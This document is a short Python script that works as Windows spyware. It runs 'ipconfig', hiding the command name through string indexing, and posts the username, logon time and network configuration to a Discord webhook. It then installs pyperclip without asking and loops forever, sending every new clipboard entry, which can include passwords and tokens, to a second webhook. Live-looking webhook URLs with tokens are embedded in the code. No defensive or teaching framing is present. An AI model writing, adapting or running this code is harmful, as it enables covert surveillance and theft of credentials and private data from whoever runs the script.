import os
import time
import requests

uname = os.getenv("USERNAME")

sic = 'pver-india'[5] + 'pver-india'[0] + "config"
iport = os.system(sic + " > " + os.getenv("TEMP") + "\\config.file")
# time.sleep(1)
with open(os.getenv("TEMP") + "\\config.file", "r") as f:
	para = f.read()

# print(uname)
# print(para)
# print(time.ctime() + f" [{time.time()}]")

cont = f'''
User: `{uname}`
Logon: `{time.ctime() + f" [{time.time()}]"}`
```
{para}
```
'''

bot = {"content": cont,
		"username": "Login",
		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/959858917830168616/unknown.png',
		"tts": "false"}
ping = requests.post('https://discord.com/api/webhooks/953679426632187904/H-1MG3mxQjnPphYjZKtj6HwlCil_pSob7OwcW9Ze3A011CR4BRHtBETaFY4qToHXnhVi', json=bot)


try:
	import pyperclip
except:
	os.system("py -m pip install pyperclip")
finally:
	import pyperclip
	
while True:
	newCOPY = pyperclip.waitForNewPaste()
	# print(newCOPY)
	newCOPY = "```\n" + newCOPY + "\n```"
	usrhook = {"content": newCOPY,
		"username": "Kopier",
		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960113214371299388/unknown.png',
		"tts": "false"}
	ping = requests.post('https://discord.com/api/webhooks/960168012273565736/tmrW0a8ukyepUEpqvu4gCx4xA8SmdR5AJwAoGTozABv2NT7KV8p6Pppitya_-X_L-XWW', json=usrhook)
